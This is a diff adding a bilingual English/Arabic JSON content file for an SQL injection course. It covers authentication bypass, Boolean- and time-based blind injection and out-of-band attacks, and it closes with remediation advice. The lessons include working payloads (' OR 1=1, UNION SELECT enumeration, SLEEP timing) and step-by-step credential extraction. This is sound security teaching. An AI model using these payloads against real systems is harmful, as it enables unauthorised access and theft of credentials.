+          "value": "' OR 1=1;--"
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "Which turns the SQL query into the following:",
+            "ar": "والذي يحول استعلام SQL إلى ما يلي:"
+          }
+        },
+        {
+          "type": "code",
+          "language": "sql",
+          "value": "select * from users where username='' and password='' OR 1=1;"
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "Because 1=1 is a true statement and we've used an OR operator, this will always cause the query to return as true, which satisfies the web applications logic that the database found a valid username/password combination and that access should be allowed.",
+            "ar": "لأن 1=1 هو عبارة صحيحة وقد استخدمنا عامل OR، فإن هذا سيتسبب دائماً في إرجاع الاستعلام كـ true، مما يلبي منطق تطبيق الويب أن قاعدة البيانات وجدت مجموعة اسم مستخدم/كلمة مرور صالحة وأنه يجب السماح بالوصول."
+          }
+        },
+        {
+          "type": "note",
+          "noteType": "success",
+          "isLab": true,
+          "value": {
+            "en": "Practice this technique in our interactive labs to master authentication bypass attacks.",
+            "ar": "مارس هذه التقنية في مختبراتنا التفاعلية لإتقان هجمات تجاوز المصادقة."
+          },
+          "link": "/sql_Injection/sql_Injection_labs",
+          "linkText": {
+            "en": "Go To Labs",
+            "ar": "انتقل إلى المختبرات"
+          }
+        }
+      ]
+    },
+    {
+      "id": "topic_6",
+      "title": {
+        "en": "Blind SQLi - Boolean Based",
+        "ar": "حقن SQL الأعمى - القائم على Boolean"
+      },
+      "elements": [
+        {
+          "type": "subtitle",
+          "value": {
+            "en": "Boolean Based SQL Injection",
+            "ar": "حقن SQL القائم على Boolean"
+          }
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "Boolean-based SQL Injection refers to the response we receive from our injection attempts, which could be a true/false, yes/no, on/off, 1/0 or any response that can only have two outcomes. That outcome confirms that our SQL Injection payload was either successful or not.",
+            "ar": "يشير حقن SQL القائم على Boolean إلى الاستجابة التي نتلقاها من محاولات الحقن الخاصة بنا، والتي يمكن أن تكون true/false أو yes/no أو on/off أو 1/0 أو أي استجابة لا يمكن أن يكون لها سوى نتيجتين. تؤكد هذه النتيجة أن حمولة حقن SQL الخاصة بنا كانت ناجحة أم لا."
+          }
+        },
+        {
+          "type": "terminal",
+          "label": {
+            "en": "Example API Endpoint",
+            "ar": "مثال على نقطة نهاية API"
+          },
+          "value": "https://website.thm/checkuser?username=admin"
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "The API endpoint returns {\"taken\":true} if the username exists and {\"taken\":false} if it doesn't. The SQL query that is processed looks like:",
+            "ar": "تُرجع نقطة نهاية API {\"taken\":true} إذا كان اسم المستخدم موجوداً و {\"taken\":false} إذا لم يكن موجوداً. يبدو استعلام SQL الذي تتم معالجته كما يلي:"
+          }
+        },
+        {
+          "type": "code",
+          "language": "sql",
+          "value": "select * from users where username = '%username%' LIMIT 1;"
+        },
+        {
+          "type": "orderedList",
+          "title": {
+            "en": "Exploitation Steps:",
+            "ar": "خطوات الاستغلال:"
+          },
+          "items": [
+            {
+              "subtitle": {
+                "en": "Find column count",
+                "ar": "ابحث عن عدد الأعمدة"
+              },
+              "text": {
+                "en": "Keep adding columns with UNION SELECT until taken returns true",
+                "ar": "استمر في إضافة أعمدة مع UNION SELECT حتى يُرجع taken قيمة true"
+              },
+              "example": {
+                "en": "admin123' UNION SELECT 1,2,3;--",
+                "ar": "admin123' UNION SELECT 1,2,3;--"
+              }
+            },
+            {
+              "subtitle": {
+                "en": "Enumerate database name",
+                "ar": "عدّد اسم قاعدة البيانات"
+              },
+              "text": {
+                "en": "Use the like operator with wildcard % to guess characters one by one",
+                "ar": "استخدم عامل like مع حرف بدل % لتخمين الأحرف واحداً تلو الآخر"
+              },
+              "example": {
+                "en": "admin123' UNION SELECT 1,2,3 where database() like 's%';--",
+                "ar": "admin123' UNION SELECT 1,2,3 where database() like 's%';--"
+              }
+            },
+            {
+              "subtitle": {
+                "en": "Find table names",
+                "ar": "ابحث عن أسماء الجداول"
+              },
+              "text": {
+                "en": "Query information_schema to enumerate tables in the discovered database",
+                "ar": "استعلم information_schema لتعداد الجداول في قاعدة البيانات المكتشفة"
+              },
+              "example": {
+                "en": "admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'u%';--",
+                "ar": "admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'u%';--"
+              }
+            },
+            {
+              "subtitle": {
+                "en": "Discover column names",
+                "ar": "اكتشف أسماء الأعمدة"
+              },
+              "text": {
+                "en": "Use the same technique to find column names in the target table",
+                "ar": "استخدم نفس التقنية للعثور على أسماء الأعمدة في الجدول المستهدف"
+              },
+              "example": {
+                "en": "admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'p%';",
+                "ar": "admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'p%';"
+              }
+            },
+            {
+              "subtitle": {
+                "en": "Extract credentials",
+                "ar": "استخرج بيانات الاعتماد"
+              },
+              "text": {
+                "en": "Finally, extract username and password by guessing character by character",
+                "ar": "أخيراً، استخرج اسم المستخدم وكلمة المرور عن طريق التخمين حرفاً بحرف"
+              },
+              "example": {
+                "en": "admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '3%'",
+                "ar": "admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '3%'"
+              }
+            }
+          ]
+        },
+        {
+          "type": "note",
+          "noteType": "info",
+          "value": {
+            "en": "This technique requires patience as you need to test each character position individually, but it can successfully extract entire databases even with minimal feedback.",
+            "ar": "تتطلب هذه التقنية صبراً لأنك تحتاج إلى اختبار كل موضع حرف بشكل فردي، ولكن يمكنها استخراج قواعد بيانات كاملة بنجاح حتى مع الحد الأدنى من التغذية الراجعة."
+          }
+        }
+      ]
+    },
+    {
+      "id": "topic_7",
+      "title": {
+        "en": "Blind SQLi - Time Based",
+        "ar": "حقن SQL الأعمى - القائم على الوقت"
+      },
+      "elements": [
+        {
+          "type": "subtitle",
+          "value": {
+            "en": "Time-Based Blind SQL Injection",
+            "ar": "حقن SQL الأعمى القائم على الوقت"
+          }
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "A time-based blind SQL injection is very similar to the above boolean-based one in that the same requests are sent, but there is no visual indicator of your queries being wrong or right this time. Instead, your indicator of a correct query is based on the time the query takes to complete. This time delay is introduced using built-in methods such as SLEEP(x) alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement.",
+            "ar": "يشبه حقن SQL الأعمى القائم على الوقت ما سبق ذكره القائم على boolean من حيث إرسال نفس الطلبات، ولكن لا يوجد مؤشر مرئي على أن استعلاماتك خاطئة أو صحيحة هذه المرة. بدلاً من ذلك، يعتمد مؤشر الاستعلام الصحيح على الوقت الذي يستغرقه الاستعلام لإكماله. يتم إدخال هذا التأخير الزمني باستخدام طرق مدمجة مثل SLEEP(x) جنباً إلى جنب مع عبارة UNION. سيتم تنفيذ طريقة SLEEP() فقط عند عبارة UNION SELECT ناجحة."
+          }
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "So, for example, when trying to establish the number of columns in a table, you would use the following query:",
+            "ar": "لذلك، على سبيل المثال، عند محاولة تحديد عدد الأعمدة في جدول، ستستخدم الاستعلام التالي:"
+          }
+        },
+        {
+          "type": "code",
+          "language": "sql",
+          "value": "admin123' UNION SELECT SLEEP(5);--"
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "If there was no pause in the response time, we know that the query was unsuccessful, so like on previous Topics, we add another column:",
+            "ar": "إذا لم يكن هناك توقف في وقت الاستجابة، فإننا نعلم أن الاستعلام لم يكن ناجحاً، لذلك كما في المواضيع السابقة، نضيف عموداً آخر:"
+          }
+        },
+        {
+          "type": "code",
+          "language": "sql",
+          "value": "admin123' UNION SELECT SLEEP(5),2;--"
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "This payload should have produced a 5-second delay, confirming the successful execution of the UNION statement and that there are two columns.",
+            "ar": "يجب أن تنتج هذه الحمولة تأخيراً لمدة 5 ثوانٍ، مما يؤكد التنفيذ الناجح لعبارة UNION وأن هناك عمودين."
+          }
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "You can now repeat the enumeration process from the Boolean-based SQL injection, adding the SLEEP() method to the UNION SELECT statement.",
+            "ar": "يمكنك الآن تكرار عملية التعداد من حقن SQL القائم على Boolean، مع إضافة طريقة SLEEP() إلى عبارة UNION SELECT."
+          }
+        },
+        {
+          "type": "code",
+          "language": "sql",
+          "value": "referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--"
+        },
+        {
+          "type": "note",
+          "noteType": "warning",
+          "value": {
+            "en": "Time-based techniques are slower than boolean-based as you need to wait for the delay on each request. Use reasonable delay values (3-5 seconds) to balance speed and reliability.",
+            "ar": "التقنيات القائمة على الوقت أبطأ من تلك القائمة على boolean حيث تحتاج إلى انتظار التأخير في كل طلب. استخدم قيم تأخير معقولة (3-5 ثوانٍ) لتوازن السرعة والموثوقية."
+          }
+        }
+      ]
+    },
+    {
+      "id": "topic_8",
+      "title": {
+        "en": "Out-of-Band SQLi",
+        "ar": "حقن SQL خارج النطاق"
+      },
+      "elements": [
+        {
+          "type": "text",
+          "value": {
+            "en": "Out-of-band SQL Injection isn't as common as it either depends on specific features being enabled on the database server or the web application's business logic, which makes some kind of external network call based on the results from an SQL query.",
+            "ar": "حقن SQL خارج النطاق ليس شائعاً كما أنه يعتمد إما على تمكين ميزات معينة على خادم قاعدة البيانات أو منطق عمل تطبيق الويب، والذي يقوم ببعض أنواع الاستدعاءات الشبكية الخارجية بناءً على نتائج استعلام SQL."
+          }
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "An Out-Of-Band attack is classified by having two different communication channels, one to launch the attack and the other to gather the results. For example, the attack channel could be a web request, and the data gathering channel could be monitoring HTTP/DNS requests made to a service you control.",
+            "ar": "يتم تصنيف هجوم خارج النطاق من خلال وجود قناتي اتصال مختلفتين، واحدة لإطلاق الهجوم والأخرى لجمع النتائج. على سبيل المثال، يمكن أن تكون قناة الهجوم طلب ويب، ويمكن أن تكون قناة جمع البيانات مراقبة طلبات HTTP/DNS المقدمة إلى خدمة تتحكم فيها."
+          }
+        },
+        {
+          "type": "orderedList",
+          "title": {
+            "en": "How Out-of-Band SQLi Works:",
+            "ar": "كيف يعمل حقن SQL خارج النطاق:"
+          },
+          "items": [
+            {
+              "text": {
+                "en": "An attacker makes a request to a website vulnerable to SQL Injection with an injection payload.",
+                "ar": "يقوم المهاجم بتقديم طلب إلى موقع ويب عرضة لحقن SQL مع حمولة حقن."
+              }
+            },
+            {
+              "text": {
+                "en": "The Website makes an SQL query to the database, which also passes the hacker's payload.",
+                "ar": "يقوم الموقع بإجراء استعلام SQL إلى قاعدة البيانات، والذي يمرر أيضاً حمولة المخترق."
+              }
+            },
+            {
+              "text": {
+                "en": "The payload contains a request which forces an HTTP request back to the hacker's machine containing data from the database.",
+                "ar": "تحتوي الحمولة على طلب يجبر طلب HTTP للعودة إلى جهاز المخترق يحتوي على بيانات من قاعدة البيانات."
+              }
+            }
+          ]
+        },
+        {
+          "type": "image",
+          "srcKey": "OutOfBand",
+          "size": "medium",
+          "caption": {
+            "en": "Out-of-Band SQL Injection attack flow diagram",
+            "ar": "مخطط تدفق هجوم حقن SQL خارج النطاق"
+          }
+        },
+        {
+          "type": "note",
+          "noteType": "info",
+          "value": {
+            "en": "Out-of-band techniques are advanced and require specific database configurations. They're particularly useful when in-band and blind techniques are not feasible.",
+            "ar": "تقنيات خارج النطاق متقدمة وتتطلب تكوينات قاعدة بيانات محددة. إنها مفيدة بشكل خاص عندما لا تكون تقنيات النطاق المباشر والأعمى ممكنة."
+          }
+        }
+      ]
+    },
+    {
+      "id": "topic_9",
+      "title": {
+        "en": "Remediation & Protection",
+        "ar": "الحلول والحماية"
+      },
+      "elements": [
+        {
+          "type": "title",
+          "value": {
+            "en": "Preventing SQL Injection",
+            "ar": "الوقاية من حقن SQL"
+          }
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "As impactful as SQL Injection vulnerabilities are, developers do have a way to protect their web applications from them by following the advice below:",
+            "ar": "على الرغم من تأثير ثغرات حقن SQL، فإن المطورين لديهم طريقة لحماية تطبيقات الويب الخاصة بهم منها باتباع النصائح أدناه:"
+          }
+        },
+        {
+          "type": "subtitle",
+          "value": {
+            "en": "1. Prepared Statements (Parameterized Queries)",
+            "ar": "1. العبارات المُعدة (الاستعلامات ذات المعاملات)"
+          }
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "In a prepared query, the first thing a developer writes is the SQL query, and then any user inputs are added as parameters afterwards. Writing prepared statements ensures the SQL code structure doesn't change and the database can distinguish between the query and the data. As a benefit, it also makes your code look much cleaner and easier to read.",
+            "ar": "في الاستعلام المُعد، أول شيء يكتبه المطور هو استعلام SQL، ثم يتم إضافة أي مدخلات مستخدم كمعاملات بعد ذلك. كتابة العبارات المُعدة تضمن أن بنية كود SQL لا تتغير ويمكن لقاعدة البيانات التمييز بين الاستعلام والبيانات. كميزة إضافية، فإنها تجعل الكود الخاص بك يبدو أكثر نظافة وأسهل للقراءة."
+          }
+        },
+        {
+          "type": "code",
+          "language": "php",
+          "value": "// Safe prepared statement\n$stmt = $pdo->prepare('SELECT * FROM users WHERE username = ? AND password = ?');\n$stmt->execute([$username, $password]);"
+        },
+        {
+          "type": "subtitle",
+          "value": {
+            "en": "2. Input Validation",
+            "ar": "2. التحقق من المدخلات"
+          }
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "Input validation can go a long way to protecting what gets put into an SQL query. Employing an allow list can restrict input to only certain strings, or a string replacement method in the programming language can filter the characters you wish to allow or disallow.",
+            "ar": "يمكن أن يقطع التحقق من المدخلات شوطاً طويلاً في حماية ما يتم وضعه في استعلام SQL. يمكن أن يقيد استخدام قائمة السماح الإدخال إلى سلاسل معينة فقط، أو يمكن لطريقة استبدال السلاسل في لغة البرمجة تصفية الأحرف التي ترغب في السماح بها أو عدم السماح بها."
+          }
+        },
+        {
+          "type": "subtitle",
+          "value": {
+            "en": "3. Escaping User Input",
+            "ar": "3. تسييج مدخلات المستخدم"
+          }
+        },
+        {
+          "type": "text",
+          "value": {
+            "en": "Allowing user input containing characters such as ' \" $ \\ can cause SQL Queries to break or, even worse, as we've learnt, open them up for injection attacks. Escaping user input is the method of prepending a backslash (\\) to these characters, which then causes them to be parsed just as a regular string and not a special character.",
+            "ar": "السماح بإدخال المستخدم الذي يحتوي على أحرف مثل ' \" $ \\ يمكن أن يتسبب في كسر استعلامات SQL أو، الأسوأ من ذلك، كما تعلمنا، فتحها لهجمات الحقن. تسييج مدخلات المستخدم هو طريقة إضافة شرطة مائلة عكسية (\\) إلى هذه الأحرف، والتي تتسبب بعد ذلك في تحليلها كسلسلة عادية وليست حرفاً خاصاً."
+          }
+        },
+        {
+          "type": "list",
+          "title": {
+            "en": "Additional Best Practices:",
+            "ar": "أفضل الممارسات الإضافية:"
+          },
+          "items": {
+            "en": [
+              "Use Web Application Firewalls (WAF) to detect and block SQL injection attempts",
+              "Implement principle of least privilege for database accounts",
+              "Disable detailed error messages in production environments",
+              "Regularly update and patch database management systems",
+              "Use ORM (Object-Relational Mapping) frameworks that handle parameterization",
+              "Conduct regular security audits and penetration testing",
+              "Monitor database logs for suspicious queries"
+            ],
+            "ar": [
+              "استخدم جدران حماية تطبيقات الويب (WAF) لاكتشاف وحظر محاولات حقن SQL",
+              "قم بتطبيق مبدأ أقل امتياز لحسابات قاعدة البيانات",
+              "قم بتعطيل رسائل الخطأ التفصيلية في بيئات الإنتاج",
+              "قم بتحديث وتصحيح أنظمة إدارة قواعد البيانات بانتظام",
+              "استخدم أطر عمل ORM (Object-Relational Mapping) التي تتعامل مع المعاملات",
+              "قم بإجراء عمليات تدقيق أمنية واختبار اختراق منتظمة",
+              "راقب سجلات قاعدة البيانات للاستعلامات المشبوهة"
+            ]
+          }
+        },
+        {
+          "type": "note",
+          "noteType": "success",
+          "isLab": true,
+          "value": {
+            "en": "Ready to test your SQL injection skills? Head to our labs and practice exploiting vulnerable applications in a safe, controlled environment.",
+            "ar": "هل أنت مستعد لاختبار مهاراتك في حقن SQL؟ توجه إلى مختبراتنا ومارس استغلال التطبيقات الضعيفة في بيئة آمنة ومحكومة."
+          },
+          "link": "/sql_Injection/sql_Injection_labs",
+          "linkText": {
+            "en": "Start Lab Challenges",
+            "ar": "ابدأ تحديات المختبر"
+          }
+        }
+      ]
+    }
+  ]
+}
